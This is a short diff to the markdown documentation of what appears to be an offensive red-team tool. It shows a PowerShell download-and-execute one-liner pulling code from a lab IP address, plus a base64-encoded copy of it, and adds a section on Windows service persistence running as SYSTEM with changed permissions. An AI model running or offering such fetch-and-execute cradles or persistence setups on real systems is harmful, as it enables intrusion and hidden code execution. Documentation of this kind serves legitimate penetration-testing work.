@@ -10,3 +10,8 @@ Basic Example:
 
 `iex ([System.Net.WebClient]::New().DownloadString('http://192.168.56.100/a'))`
 `aQBlAHgAIAAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AF0AOgA6AE4AZQB3ACgAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA2AC4AMQAwADAALwBhACcAKQApAA==`
+
+### Windows Service Persistence
+
+Creates a Windows Service (running as SYSTEM) with the specified options and uses `sc sdset` to assign start/stop permissions to the user SID. Requires you to manually upload a payload.
+![Service](images/service.png)
